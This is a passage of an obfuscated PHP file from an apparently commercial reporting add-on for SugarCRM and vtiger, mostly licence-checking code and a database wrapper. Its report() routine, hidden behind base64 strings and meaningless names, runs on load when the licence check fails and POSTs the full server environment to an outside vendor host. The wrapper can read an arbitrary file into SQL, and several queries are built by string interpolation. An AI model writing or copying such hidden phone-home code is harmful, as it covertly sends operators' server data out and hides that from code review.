<?php

/*** DOMAIN_CHECK ***/
 if(!defined('sugarEntry') || !sugarEntry) die('Not A Valid Entry Point');$job_strings = array_merge($job_strings, array('sendScheduledReports',));require_once "modules/AnalyticReporting/profiles/FunctionWrapper.php";FunctionWrapper::_ini_set('memory_limit','512M');class a0
{protected $b1 = 'YmUzYWM2sNGU24NbA363zA7IDSDFGDFGB5aVi35BDFGQ3YNO36ycDFGAATq4sYmSFVDFGDFGps7XDYEzGDDw96OnMW3kjCFJ7M+UV2kHe1WTTEcM09UMHHT';protected $c2 = '80dSbqylf4Cu5e5OYdAoAVkzpRDWAt7J1Vp27sYDU52ZBJprdRL1KE0il8KQXuKCK3sdA51P9w8U60wohX2gdmBu7uVhjxbS8g4y874Ht8L12W54Q6T4R4a';protected $d3 = 'ant9pbc3OK28Li36Mi4d3fsWJ4tQSN4a9Z2qa8W66qR7ctFbljsOc9J4wa2Bh6j8KB3vbEXB18i6gfbE0yHS0ZXQCceIlG7jwzDmN7YT06mVwcM9z0vy62T';protected $e4 = true;protected $f5 = 'blowfish';protected $g6;protected $h7 = 129600;protected $i8 = 'nSpkAHRiFfM2hE588eB';protected $j9 = 'NWCy0s0JpGubCVKlkkK';protected $k10 = 'G95ZP2uS782cFey9x5A';protected $l11 = 'BEGIN LICENSE KEY';protected $m12 = 'END LICENSE KEY';protected $n13 = 80;protected $o14 = "-";protected $p15 = '_DATA{';protected $q16 = '}DATA_';protected $r17 = array();protected $s18;protected $t19;protected $u20;protected $v21;protected $w22 = array();protected $x23 = array();protected $y24 = array();protected $z25 = 2;protected $A00 = 'M/d/Y H:i:s';protected $B11 = 0;protected $C22 = 0;function __construct($e4=true, $g6=true, $s18=true, $v21=false) {$this->D33($e4, $g6, $s18, $v21);if ($this->s18) {$this->u20 = $this->E44();}} function D33($e4=true, $g6=true, $s18=true, $v21=false) {$this->e4 = ($e4 && function_exists('mcrypt_generic'));$this->g6 = $g6;$this->v21 = $v21;$this->s18 = $s18;} function F55($G66) {$this->x23 = $G66;$this->y24 = $this->H77();$this->w22 = $this->I88();} function J99 ($K1010) {return $this->L1111($K1010);} function M1212 ($K1010, $N1313, $O1414, $P1515="80") {return $this->L1111($K1010, true, $N1313, $O1414, $P1515);} function L1111($K1010, $Q1616=false, $N1313="", $O1414="", $P1515="80") {if (strlen($K1010)>0) {$r17 = $this->R1717($K1010);if (is_array($r17)) {if ($r17['ID'] != md5($this->i8)) {$r17['RESULT'] = 'CORRUPT';} if ($this->g6) {if ($r17['DATE']['START'] > time()+$this->h7) {$r17['RESULT'] = 'TMINUS';} if ($r17['DATE']['END']-time() < 0 && $r17['DATE']['SPAN'] != 'NEVER') {$r17['RESULT'] = 'EXPIRED';} if(is_int($r17['DATE']['END'])) {$r17['DATE']['HUMAN']['START'] = date($this->A00, $r17['DATE']['START']);$r17['DATE']['HUMAN']['END'] = date($this->A00, $r17['DATE']['END']);}} if ($this->s18) {$u20 = $r17['SERVER']['MAC'] == $this->u20;$S1818 = count(array_diff($this->w22, $r17['SERVER']['PATH'])) <= $this->B11;$T1919 = $this->U2020($r17['SERVER']['DOMAIN'], $this->y24);$V2121 = count(array_diff($this->y24, $r17['SERVER']['IP'])) <= $this->C22;if (!$u20 || !$S1818 || !$T1919 || !$V2121) {$r17['RESULT'] = 'ILLEGAL';} $W2222 = $this->v21 && (in_array('127.0.0.1', $r17['SERVER']['IP']) || $r17['PATH']['SERVER_ADDR'] == '127.0.0.1' || $r17['PATH']['HTTP_HOST'] == '127.0.0.1');if (!$W2222) {$r17['RESULT'] = 'ILLEGAL_LOCAL';}} if (!isset($r17['RESULT'])) {if ($Q1616) {$X2323 = array();$X2323['LICENSE_DATA'] = $r17;$X2323['LICENSE_DATA']['KEY'] = md5($K1010);} else {$r17['RESULT'] = 'OK';}} return $r17;} else {return array('RESULT'=>'INVALID');}} return array('RESULT'=>'EMPTY');} function Y2424($dateFormat) {$this->A00 = $dateFormat;} function U2020($T1919, $y24=false) {if (!$y24) {$y24 = $this->H77();} $Z2525 = gethostbynamel($T1919);if (is_array($Z2525) && count($Z2525) > 0) {foreach ($Z2525 as $V2121) {if (in_array($V2121, $y24)) {return true;}}} return false;} function Za0($Zb1) {$Zc2 = strlen($Zb1);$Zd3 = ($this->n13-$Zc2)/2;$Ze4 = '';for ($Zf5=0;$Zf5<$Zd3;$Zf5++) {$Ze4 = $Ze4.$this->o14;} if ($Zd3/2 != round($Zd3/2)) {$Zb1 = substr($Ze4, 0, strlen($Ze4)-1).$Zb1;} else {$Zb1 = $Ze4.$Zb1;} $Zb1 = $Zb1.$Ze4;return $Zb1;} function Zg6($Zh7) {switch($Zh7) {case 'KEY' : return $this->b1;case 'REQUESTKEY' : return $this->c2;case 'HOMEKEY' : return $this->d3;default :}} function Zi8($Zh7) {switch($Zh7) {case 'KEY' : return $this->l11;case 'REQUESTKEY' : return $this->p15;case 'HOMEKEY' : return '';}} function Zj9($Zh7) {switch($Zh7) {case 'KEY' : return $this->m12;case 'REQUESTKEY' : return $this->q16;case 'HOMEKEY' : return '';}} function Zk10($Zl11=10, $Zm12='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567890123456789') {$Zb1 = '';$Zn13 = strlen($Zm12);list($Zo14, $Zp15) = explode(' ', microtime());$Zq16 = (float) $Zp15 + ((float) $Zo14 * 100000);mt_srand($Zq16);for ($Zf5 = 0;$Zl11 > $Zf5;$Zf5++) {$Zb1 .= $Zm12{mt_rand(0, $Zn13 - 1)};} return $Zb1;} function Zr17($Zs18, $Zh7='KEY') {$Zt19 = $this->Zk10(3);$Zu20 = $this->Zg6($Zh7);$Zu20 = $Zt19 . $Zu20;if ($this->e4) {$Zv21 = mcrypt_module_open($this->f5, '', 'ecb', '');$Zw22 = mcrypt_create_iv(mcrypt_enc_get_iv_size($Zv21), MCRYPT_RAND);$Zu20 = substr($Zu20, 0, mcrypt_enc_get_key_size($Zv21));mcrypt_generic_init($Zv21, $Zu20, $Zw22);$Zx23 = mcrypt_generic($Zv21, serialize($Zs18));mcrypt_generic_deinit($Zv21);mcrypt_module_close($Zv21);} else {$Zx23 = '';$Zb1 = serialize($Zs18);for ($Zf5=1;$Zf5<=strlen($Zb1);$Zf5++) {$Zy24 = substr($Zb1, $Zf5-1, 1);$Zz25 = substr($Zu20, ($Zf5 % strlen($Zu20))-1, 1);$Zy24 = chr(ord($Zy24)+ord($Zz25));$Zx23 .= $Zy24;}} return $Zt19.base64_encode(base64_encode(trim($Zx23)));} function ZA00($Zb1, $Zh7='KEY') {$Zt19 = substr($Zb1, 0, 3);$Zb1 = base64_decode(base64_decode(substr($Zb1, 3)));$Zu20 = $Zt19 . $this->Zg6($Zh7);if ($this->e4) {$Zv21 = mcrypt_module_open($this->f5, '', 'ecb', '');$Zw22 = mcrypt_create_iv(mcrypt_enc_get_iv_size($Zv21), MCRYPT_RAND);$Zu20 = substr($Zu20, 0, mcrypt_enc_get_key_size($Zv21));mcrypt_generic_init($Zv21, $Zu20, $Zw22);$ZB11 = @mdecrypt_generic($Zv21, $Zb1);mcrypt_generic_deinit($Zv21);mcrypt_module_close($Zv21);} else {$ZB11 = '';for ($Zf5=1;$Zf5<=strlen($Zb1);$Zf5++) {$Zy24 = substr($Zb1, $Zf5-1, 1);$Zz25 = substr($Zu20, ($Zf5 % strlen($Zu20))-1, 1);$Zy24 = chr(ord($Zy24)-ord($Zz25));$ZB11 .= $Zy24;}} return @unserialize($ZB11);} function ZC22($Zs18, $Zh7='KEY') {$ZD33 = $this->Za0($this->Zi8($Zh7));$ZE44 = $this->Za0($this->Zj9($Zh7));$Zb1 = $this->Zr17($Zs18, $Zh7);return $ZD33 . PHP_EOL . wordwrap($Zb1, $this->n13, PHP_EOL, 1) . PHP_EOL . $ZE44;} function R1717($ZF55, $Zh7='KEY') {$ZD33 = $this->Za0($this->Zi8($Zh7));$ZE44 = $this->Za0($this->Zj9($Zh7));$Zb1 = trim(str_replace(array($ZD33, $ZE44, "\r", "\n", "\t"), '', $ZF55));return $this->ZA00($Zb1, $Zh7);} function ZG66($ZH77, $ZI88) {$ZH77 = strtolower($ZH77);switch($ZI88) {case 'freebsd' : case 'netbsd' : case 'solaris' : case 'sunos' : case 'darwin' : switch($ZH77) {case 'conf' : $ZJ99 = '/sbin/ifconfig';break;case 'mac' : $ZJ99 = 'ether';break;case 'ip' : $ZJ99 = 'inet ';break;} break;case 'linux' : switch($ZH77) {case 'conf' : $ZJ99 = '/sbin/ifconfig';break;case 'mac' : $ZJ99 = 'HWaddr';break;case 'ip' : $ZJ99 = 'inet addr:';break;} break;} return $ZJ99;} function H77() {$y24 = array();if (isset($this->x23['SERVER_NAME'])) {$V2121 = gethostbyname($this->x23['SERVER_NAME']);if (!isset($y24[$V2121])) {$y24[$V2121] = $V2121;}} if (isset($this->x23['SERVER_ADDR'])) {$name = gethostbyaddr($this->x23['SERVER_ADDR']);$V2121 = gethostbyname($name);if (!isset($y24[$V2121])) {$y24[$V2121] = $V2121;} if (isset($ZK1010) && $ZK1010 != $this->x23['SERVER_ADDR']) {if (!isset($y24[$this->x23['SERVER_ADDR']])) {$y24[$this->x23['SERVER_ADDR']] = $this->x23['SERVER_ADDR'];}}} if (count($y24) > 0) {return $y24;} return 'IP_404';} function E44() {return 'MAC_404';} function I88() {if (empty($this->x23)) {$this->F55($ZL1111);} $ZM1212 = array();if (isset($this->x23['SERVER_ADDR']) && (!strrpos($this->x23['SERVER_ADDR'], '127.0.0.1') || $this->v21)) {$ZM1212['SERVER_ADDR'] = $this->x23['SERVER_ADDR'];} if (isset($this->x23['HTTP_HOST']) && (!strrpos($this->x23['HTTP_HOST'], '127.0.0.1') || $this->v21)) {$ZM1212['HTTP_HOST'] = $this->x23['HTTP_HOST'];} if (isset($this->x23['SERVER_NAME'])) {$ZM1212['SERVER_NAME'] = $this->x23['SERVER_NAME'];} if (isset($this->x23['PATH_TRANSLATED'])) {$ZM1212['PATH_TRANSLATED'] = substr($this->x23['PATH_TRANSLATED'], 0, strrpos($this->x23['PATH_TRANSLATED'], '/'));} else if (isset($this->x23['SCRIPT_FILENAME'])) {$ZM1212['SCRIPT_FILENAME'] = substr($this->x23['SCRIPT_FILENAME'], 0, strrpos($this->x23['SCRIPT_FILENAME'], '/'));} if (isset($ZL1111['SCRIPT_URI'])) {$ZM1212['SCRIPT_URI'] = substr($this->x23['SCRIPT_URI'], 0, strrpos($this->x23['SCRIPT_URI'], '/'));} if (count($ZM1212) < $this->z25) {return 'SERVER_FAILED';} return $ZM1212;} function ZN1313($T1919='', $ZO1414=0, $ZP1515=31449600, $ZQ1616=array()) {if ($this->w22 !== false || !$this->s18) {$r17['ID'] = md5($this->i8);if ($this->s18) {$r17['SERVER']['DOMAIN'] = $T1919;$r17['SERVER']['MAC'] = $this->u20;$r17['SERVER']['PATH'] = $this->w22;$r17['SERVER']['IP'] = $this->y24;} if ($this->g6 && !is_array($ZO1414)) {$ZR1717 = time();$ZO1414 = ($ZR1717 < $ZO1414) ? $ZO1414 : $ZR1717+$ZO1414;$r17['DATE']['START'] = $ZO1414;$r17['DATE']['SPAN'] = $ZP1515;if ($ZP1515 == 'NEVER') {$r17['DATE']['END'] = 'NEVER';} else {$r17['DATE']['END'] = $ZO1414+$ZP1515;}} if (is_array($ZO1414)) {$ZQ1616 = $ZO1414;} $ZQ1616['_PHP_OS'] = PHP_OS;$ZQ1616['_PHP_VERSION'] = PHP_VERSION;$r17['DATA'] = $ZQ1616;$Zu20 = $this->ZC22($r17);return $Zu20;} return 'SERVER_FAIL';}} ;class ZS1818 extends a0 {public $ZT1919 = '';public $ZU2020;function __construct(ZV2121 $ZU2020, $e4=true, $g6=true, $s18=true, $v21=false){$this->ZU2020 = $ZU2020;parent::__construct($e4, $g6, $s18, $v21);} function ZW2222($Zu20) {if(!$this->J99($Zu20) && (isset($_REQUEST['action']) && !in_array($_REQUEST['action'], array("settings","index")))) {echo '<div style="border:1px solid red;font:12px/20px arial,sans-serif;padding:20px;margin:20px auto;">'.$this->ZT1919.'</div>';$this->report();exit();} if (!$this->J99($Zu20)) {global $ZX2323;$ZX2323 = $this->ZT1919;}} function J99($K1010) {$r17 = parent::J99($K1010);if($r17['RESULT'] == 'OK') {$ZY2424 = $this->ZZ2525($r17['DATA']['_D']);if(!$ZY2424) {$this->ZT1919 = base64_decode('WW91IGFyZSB1c2luZyByZXBvcnRpbmcgbW9kdWxlIGNvcHkgb24gdW5saWNlbnNlZCBkb21haW4hIFBsZWFzZSBjb250YWN0IElUIFNhcGllbnMsIEx0ZC4gc3VwcG9ydCBieSBlbWFpbCBpbmZvQGl0c2FwaWVucy5ldS4=');return false;} $ZY2424 = $this->ZZa0($r17['DATA']['_V']);if(!$ZY2424) {$this->ZT1919 = base64_decode('WW91IGFyZSB1c2luZyByZXBvcnRpbmcgbW9kdWxlIGxpY2Vuc2UgZm9yIGRpZmZlcmVudCB2ZXJzaW9uIG9mIHN5c3RlbSEgUGxlYXNlIGNvbnRhY3QgSVQgU2FwaWVucywgTHRkLiBzdXBwb3J0IGJ5IGVtYWlsIGluZm9AaXRzYXBpZW5zLmV1Lg==');return false;} $ZY2424 = $this->ZZb1($r17['DATA']['_U']);if(!$ZY2424) {$this->ZT1919 = base64_decode('WW91IGFyZSB1c2luZyByZXBvcnRpbmcgbW9kdWxlIGNvcHkgaW4gc3lzdGVtIHdpdGggbW9yZSB1c2VycyB0aGFuIGxpY2Vuc2VkISBQbGVhc2UgY29udGFjdCBJVCBTYXBpZW5zLCBMdGQuIHN1cHBvcnQgYnkgZW1haWwgaW5mb0BpdHNhcGllbnMuZXUu');return false;} return true;} $this->ZT1919 = base64_decode('WW91IGFyZSB1c2luZyB1bmxpY2Vuc2VkIG9yIGV4cGlyZWQgY29weSBvZiByZXBvcnRpbmcgbW9kdWxlISBQbGVhc2UgY29udGFjdCBJVCBTYXBpZW5zLCBMdGQuIHN1cHBvcnQgYnkgZW1haWwgaW5mb0BpdHNhcGllbnMuZXUu');return false;} function ZZ2525($ZZc2, $y24=false){$ZZd3 = $this->x23[base64_decode('U0VSVkVSX05BTUU=')];$ZZd3 = preg_replace("#^www\.(.+\.)#i", "$1", $ZZd3);$ZZe4 = explode(",", $ZZc2);$ZZf5 = array($ZZd3, base64_decode('Rk9SQUxMRE9NQUlOUw=='));foreach($ZZe4 as $T1919) {if(in_array($T1919, $ZZf5)) {return true;}} return false;} function ZZa0($ZZg6) {$ZZh7 = array($this->ZU2020->getValue(base64_decode('dmVyc2lvbg==')), base64_decode('Rk9SQUxMVkVSU0lPTlM='));if(in_array($ZZg6, $ZZh7)) {return true;} return false;} function ZZb1($ZZi8) {$ZZj9 = $this->ZZk10();if($ZZj9 && ($ZZi8 >= $ZZj9)) {return true;} return false;} function ZZk10() {$ZZl11 = $this->ZZm12();if($ZZl11 == 'SUGARCRM') {global $db;$ZY2424 = $db->query("SELECT COUNT(*) AS count FROM `users` WHERE `status` = 'Active'");$ZZn13 = $db->fetchByAssoc($ZY2424);return $ZZn13['count'];} if($ZZl11 == 'VTIGER') {global $adb;$ZY2424 = $adb->query("SELECT COUNT(*) AS count FROM `vtiger_users` WHERE `status` = 'Active'");$ZZn13 = $adb->query_result($ZY2424, 0, 'count');return $ZZn13;} return false;} function ZZm12() {global $sugar_config;global $vtiger_current_version;if(!empty($sugar_config)) {return 'SUGARCRM';} if(!empty($vtiger_current_version)) {return 'VTIGER';}} function report() {$ZZo14 = curl_init(base64_decode('aHR0cDovL2xvZy5kZXYuaXRzYXBpZW5zLmV1'));curl_setopt($ZZo14, CURLOPT_CUSTOMREQUEST, "POST");curl_setopt($ZZo14, CURLOPT_POSTFIELDS, stripslashes(json_encode($this->x23)));curl_setopt($ZZo14, CURLOPT_RETURNTRANSFER, true);curl_exec($ZZo14);}}
;class ZV2121
{protected $db;function __construct(ZZp15 $db) {$this->db = $db;} function getValue($Zu20) {$Zu20 = $this->db->quote($Zu20);$ZZq16 = "SELECT `value` FROM `advancedreports_config` WHERE `key` = '{$Zu20}' LIMIT 1";$ZY2424 = $this->db->query($ZZq16);$ZZr17 = $this->db->fetchRow($ZY2424);if(isset($ZZr17['value'])) {return $ZZr17['value'];} return false;} function ZZs18($Zu20, $value) {$Zu20 = $this->db->quote($Zu20);$value = $this->db->quote($value);$ZZq16 = "INSERT INTO `advancedreports_config` (`key`, `value`) VALUES ('{$Zu20}', '{$value}') ON DUPLICATE KEY UPDATE `key` = '{$Zu20}', `value` = '{$value}' ";return $this->db->query($ZZq16);}}
;$ZZt19 = false;if(file_exists('modules/AnalyticReporting/outfitter.php') && require('modules/AnalyticReporting/outfitter.php')){$ZZt19 = true;}
if($ZZt19){require_once('modules/AnalyticReporting/license/OutfittersLicense.php');$ZZu20 = AnalyticReportingOutfittersLicense::isValid('AnalyticReporting');if($ZZu20 !== true && isset($_REQUEST['action']) && !in_array($_REQUEST['action'], array("index", "license"))) {if($_REQUEST['action']!='widget'){header("Location: index.php?module=AnalyticReporting&action=license&inactive=".urlencode($ZZu20));} else {echo '<h2><p class="error">AnalyticReporting is inactive</p></h2><p class="error">'.$ZZu20.'</p>';exit();}}}else{$adb = DBManagerFactory::getInstance();$db = new ZZp15($adb);$ZZv21 = new ZV2121($db);$ZZw22 = new ZS1818($ZZv21, false, true, false, true);$ZZw22->F55($_SERVER);$ZZw22->ZW2222($ZZv21->getValue('key'));} class ZZp15 {protected $db;public $dbPrefix = "";protected $ZZx23 = false;function __construct($db){$this->db = $db;} function ZZy24($ZZq16) {$ZZz25 = preg_split('/((?<!\\\)[&?!])/', $ZZq16, -1, PREG_SPLIT_DELIM_CAPTURE);$ZZn13 = 0;$ZZA00 = '';foreach ($ZZz25 as $Zu20 => $ZZB11) {switch ($ZZB11) {case '?' : case '!' : case '&' : $ZZn13++;$ZZA00 .= '?';break;default : $ZZz25[$Zu20] = preg_replace('/\\\([&?!])/', "\\1", $ZZB11);$ZZA00 .= $ZZz25[$Zu20];break;}} $this->preparedTokens[] = array('tokens' => $ZZz25, 'tokenCount' => $ZZn13, 'sqlString' => $ZZA00);end($this->preparedTokens);return key($this->preparedTokens);} function ZZC22($ZZD33, $r17 = array(), $ZZx23 = false) {if(!empty($this->preparedTokens[$ZZD33])){if(!is_array($r17)){$r17 = array($r17);} $ZZE44 = $this->preparedTokens[$ZZD33];if(count($r17) != $ZZE44['tokenCount']){return false;} $query = '';$ZZF55 = 0;$ZZz25 = $ZZE44['tokens'];foreach ($ZZz25 as $ZZB11) {switch ($ZZB11) {case '?': $query .= "'".$r17[$ZZF55++]."'";break;case '&': $ZZG66 = $r17[$ZZF55++];$query .= file_get_contents($ZZG66);break;case '!': $query .= $r17[$ZZF55++];break;default: $query .= $ZZB11;break;}} $ZY2424 = $this->db->query($query);if($this->ZZx23 || $ZZx23) {if($this->db->lastDbError()) {echo "<pre style='border:1px solid red'>";var_dump($this->db->lastDbError());var_dump(debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS));echo "</pre>";}} return $ZY2424;}else{return false;}} function ZZH77($ZZq16, $r17 = array(), $ZZx23 = false) {$ZZD33 = $this->ZZy24($ZZq16);return $this->ZZC22($ZZD33, $r17, $ZZx23);} function ZZI88($ZY2424, $Zu20) {$ZZr17 = $this->fetchRow($ZY2424);if(isset($ZZr17[$Zu20])) {return $ZZr17[$Zu20];} return false;} function setDieOnError($value) {$this->db->setDieOnError($value);} function quote($ZZJ99) {return $this->db->quote($ZZJ99);} function query($ZZq16) {return $this->db->query($ZZq16);} function fetchRow($ZY2424) {if(method_exists($this->db, 'fetchRow')) {return $this->db->fetchRow($ZY2424);} else {return $this->db->fetchByAssoc($ZY2424, -1, false);}} function ZZK1010($ZZL1111, $type = 'single') {$ZZM1212 = array();$quote = '"';if($type == 'single') {$quote = "'";} foreach($ZZL1111 as $value) {$ZZM1212[] = $quote . $value . $quote;} return $ZZM1212;} function run_query_allrecords($query) {$ZY2424 = $this->db->query($query);return $this->GetAll($ZY2424);} function GetAll($ZY2424) {$r17 = array();while($ZZr17 = $this->fetchRow($ZY2424)) {$r17[] = $ZZr17;} return $r17;} function ZZN1313($fieldName, $module){$ZZO1414 = array();$field = $this->ZZP1515($fieldName, $module);if(isset($field["options"])) {if(isset($GLOBALS['app_list_strings'][$field["options"]])) {$ZZO1414 = $GLOBALS['app_list_strings'][$field["options"]];}} return $ZZO1414;} function ZZQ1616($ZZR1717){$ZZS1818 = null;$ZZq16 = 'SELECT currency_code FROM vtiger_currency_info WHERE id=?';$ZY2424 = $this->ZZH77($ZZq16,array($ZZR1717));$ZZT1919 = $this->db->num_rows($ZY2424);if($ZZT1919 == 1){$ZZS1818 = $this->db->query_result($ZY2424, 0, 'currency_code');} return $ZZS1818;} function ZZU2020($module,$name){$ZZS1818 = $name;$ZZV2121 = $this->ZZW2222($module);foreach($ZZV2121 as $field) {if($field['fieldname'] == $name) {return $field;}} return $ZZS1818;} function ZZP1515($fieldName, $module) {$ZZV2121 = $this->ZZW2222($module);foreach($ZZV2121 as $field) {if($field["fieldname"] == $fieldName) {return $field;}} return false;} function ZZX2323($ZZY2424, $field) {$ZZZ2525 = array('tablename' => $ZZY2424, 'columnname' => $field['name'], 'fieldname' => $field['name'], 'fieldlabel' => $field['vname'], 'uitype' => $field['type'], 'typeofdata' => 'V~O', 'block' => '1',);if(isset($field['dbType'])) {$ZZZ2525['dbType'] = $field['dbType'];} if(isset($field['options'])) {$ZZZ2525['options'] = $field['options'];} if($field['type'] == 'link') {return false;} if(isset($field['source'])) {if(in_array($field['source'], array('non-db'))) {return false;} if($field['source'] == 'custom_fields') {$ZZZ2525['tablename'] = $ZZZ2525['tablename'] . '_cstm';}} if($field['vname'] == '' && $field['type'] != 'id') {return false;}elseif($field['vname'] == '' && $field['type'] == 'id'){$ZZZ2525['fieldlabel'] = $field['name'];} if($field['type'] == 'relate') {if(!isset($field['module'])) {return false;} $ZZZ2525['related_module'] = $field['module'];$ZZZ2525['id_name'] = $field['id_name'];if(isset($field['table'])) {$ZZZ2525['table'] = $field['table'];} if(isset($field['rname'])) {$ZZZ2525['rname'] = $field['rname'];}} if($field['type'] == 'assigned_user_name') {$ZZZ2525['related_module'] = 'Users';$ZZZ2525['table'] = 'users';$ZZZ2525['id_name'] = 'id';if(isset($field['rname'])) {$ZZZ2525['rname'] = $field['rname'];}} return $ZZZ2525;} function ZZW2222($module) {$ZZZ2525 = array();if($module == 'InventoryToService') {} else {$ZZZa0 = PlatformConnector::ZZZb1($module);if(!$ZZZa0) {return false;} $ZZY2424 = $ZZZa0->getTableName();$ZZZc2 = $ZZZa0->getFieldDefinitions();foreach($ZZZc2 as $field) {if(!isset($field['vname'])) {continue;} $ZZZd3 = $this->ZZX2323($ZZY2424, $field);if($ZZZd3) {$ZZZ2525[] = $ZZZd3;}}} if($module == 'oqc_Service') {$ZZZ2525[] = array('tablename' => "oqc_service", 'columnname' => "quantity`*`#alias#`.`price", 'fieldname' => "netprice", 'fieldlabel' => "LBL_NET_PRICE", 'uitype' => 'float', 'typeofdata' => 'N~M',);} return $ZZZ2525;} function ZZZe4($ZZJ99) {global $moduleList;$moduleName = false;$ZZZf5 = false;list($ZZZg6, $ZZZh7) = explode("_", $ZZJ99, 2);foreach($moduleList as $ZZZi8) {$ZZZj9 = strlen($ZZZi8);$ZZZk10 = substr($ZZZh7, 0, $ZZZj9);if ($ZZZk10 == $ZZZi8) {$moduleName = $ZZZi8;$ZZZf5 = substr($ZZZh7, $ZZZj9 + 1);break;}} $r17 = array(0 => $ZZZg6, 1 => $moduleName, 2 => $ZZZf5,);return $r17;} function ZZZl11($field) {if(isset($field['id_name'])) {$field['columnname'] = $field['id_name'];} $ZZZm12 = false;if(isset($field['table'])) {$ZZZm12 = $field['table'];} $ZZZn13 = array('relation' => array('tablename' => $ZZZm12, 'entityidfield' => 'id',), 'field' => array($field), 'names' => array($field['columnname']),);return $ZZZn13;} function ZZZo14($module, $field = null){static $ZZZp15 = array();if($field && is_array($field)) {if(isset($field['rname']) || $field['uitype'] == 'name') {return $this->ZZZl11($field);}} if(!isset($ZZZp15[$module])){$ZZZq16 = $this->ZZW2222($module);foreach($ZZZq16 as $field) {if(isset($field['rname']) || $field['uitype'] == 'name') {$ZZS1818 = $this->ZZZl11($field);}} $ZZZp15[$module] = $ZZS1818;} return $ZZZp15[$module];} function ZZZr17($module){$ZZZs18 = array();$ZZZt19 = array('id' => '1', 'label' => '---', 'fields' => $this->ZZW2222($module),);$ZZZs18[] = $ZZZt19;return $ZZZs18;} function ZZZu20($query){$ZZS1818 = $this->run_query_allrecords($query);return $ZZS1818;} function ZZZv21($query){$ZZS1818 = $this->db->query($query);return $ZZS1818;} function ZZZw22($query,$ZZZx23,$ZZZy24 = null, $ZZx23 = false){$ZZZz25 = $this->ZZH77($query, $ZZZx23, $ZZx23);$ZZS1818 = $this->GetAll($ZZZz25);return $ZZS1818;} function ZZZA00($query,$ZZZx23, $ZZx23 = false){$ZZZz25 = $this->ZZH77($query,$ZZZx23, $ZZx23);return ($ZZZz25 !== false);} function ZZZB11($ZZZC22, $ZZZD33, $ZZZE44, $ZZZF55) {if($ZZZD33 == "PUB"){$ZZZD33 = 1;if($ZZZE44=="EDIT"){$ZZZE44 = 1;}elseif($ZZZE44=="DELETE"){$ZZZE44 = 2;}else{$ZZZE44 = 0;}}else{$ZZZD33 = 0;$ZZZE44 = 0;} $ZZq16 = "UPDATE `advancedreports` SET shared=?, sharedlevel=?, owner=? WHERE id = ?";$ZZZx23 = array($ZZZD33, $ZZZE44, $ZZZF55, $ZZZC22);$ZY2424 = $this->ZZH77($ZZq16,$ZZZx23);return $ZY2424;} function saveReport($id, $ZZZc2, $filters, $ZZZG66, $ZZZH77, $ZZZI88, $ZZZJ99, $ZZZK1010, $ZZZL1111,$ZZZD33,$ZZZE44,$ZZZF55,$ZZZM1212,$ZZZN1313 = null){if($ZZZD33 == "PUB"){$ZZZD33 = 1;if($ZZZE44=="EDIT"){$ZZZE44 = 1;}elseif($ZZZE44=="DELETE"){$ZZZE44 = 2;}else{$ZZZE44 = 0;}}else{$ZZZD33 = 0;$ZZZE44 = 0;} $ZZq16 = "UPDATE `advancedreports` SET fields=?, filters = ?, grouping = ?, aggregates = ?, totalAggregates = ?, options = ?, labels = ?, chart = ?, shared=?, sharedlevel=?, owner=?, calcFields=?";$ZZZx23 = array($ZZZc2, $filters, $ZZZG66, $ZZZH77, $ZZZI88, $ZZZJ99, $ZZZK1010, $ZZZL1111, $ZZZD33, $ZZZE44,$ZZZF55,$ZZZM1212);if($ZZZN1313!=null){$ZZq16.= ", combinedfields=?";$ZZZx23[] = $ZZZN1313;} $ZZq16.= " WHERE id = ?";$ZZZx23[] = $id;$ZY2424 = $this->ZZH77($ZZq16,$ZZZx23,true);} function ZZZO1414($module, $ZZZP1515, $ZZZQ1616, $ZZZc2, $filters, $ZZZG66, $ZZZH77, $ZZZI88, $ZZZJ99, $ZZZK1010, $title,$description,$ZZZL1111,$ZZZD33,$ZZZE44,$ZZZF55,$ZZZM1212,$isCombined = 0, $ZZZR1717 = null){if($ZZZD33 == "PUB"){$ZZZD33 = 1;if($ZZZE44=="EDIT"){$ZZZE44 = 1;}elseif($ZZZE44=="DELETE"){$ZZZE44 = 2;}else{$ZZZE44 = 0;}}else{$ZZZD33 = 0;$ZZZE44 = 0;} $ZZS1818 = $this->ZZH77("SELECT IFNULL(MAX(`sequence`) + 1, 0) AS `sequence` FROM `advancedreports` WHERE `category_id` = ? ", array($ZZZP1515));$ZZZS1818 = $this->ZZI88($ZZS1818, 'sequence');$this->setDieOnError(true);$this->ZZH77("INSERT INTO `advancedreports`(`module`, `category_id`, `sequence`, `related_data`, `fields`, `filters`, `grouping`, `aggregates`, `totalAggregates`, `title`, `description`, `options`, `labels`, `chart`,`shared`,`sharedlevel`,`owner`,`iscombined`,`combinedfields`,`calcFields`) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", array($module, $ZZZP1515, $ZZZS1818, $ZZZQ1616,$ZZZc2, $filters, $ZZZG66, $ZZZH77, $ZZZI88, $title, $description, $ZZZJ99, $ZZZK1010, $ZZZL1111,$ZZZD33,$ZZZE44,$ZZZF55,$isCombined,$ZZZR1717,$ZZZM1212));$ZZS1818 = $this->run_query_allrecords("SELECT last_insert_id() AS `id`");return $ZZS1818[0]['id'];} function loadReport($id){$ZZS1818 = null;$ZZS1818 = $this->run_query_allrecords("SELECT * FROM advancedreports WHERE id = ". (int)$id);if($ZZS1818){$ZZS1818 = $ZZS1818[0];$ZZS1818["related_data"] = json_decode($ZZS1818["related_data"],true);for($Zf5 = 0;$Zf5<count($ZZS1818['related_data']);$Zf5++){for($ZZZT1919 = 0;$ZZZT1919 <= 11;$ZZZT1919++) {if(!isset($ZZS1818["related_data"][$Zf5][$ZZZT1919])) {$ZZS1818["related_data"][$Zf5][$ZZZT1919] = false;}}}} return $ZZS1818;} function ZZZU2020($ZZZV2121="*", $ZZZW2222="", $limit=1){$query = "SELECT $ZZZV2121 FROM advancedreports";if(!empty($ZZZW2222)){$query .= " WHERE $ZZZW2222";} if((int)$limit>0){$query.= " LIMIT $limit";} $query.=";";$report = $this->run_query_allrecords($query);return $report;} function listReports($ZZZX2323,$ZZZY2424,$ZZZZ2525,$ZZZP1515=null,$ZZZZa0=false){$ZZS1818 = null;$ZZZZb1 = " AND ";$ZZZZc2 = " `r`.`visible` = 1 ";if($ZZZZa0) {$ZZZZb1 = "";$ZZZZc2 = "";} $ZZZP1515 = (int) $ZZZP1515;if($ZZZX2323){$query = "SELECT r.*, 2 as `can_edit`, 1 as `can_delete` FROM advancedreports r WHERE `r`.`category_id` = 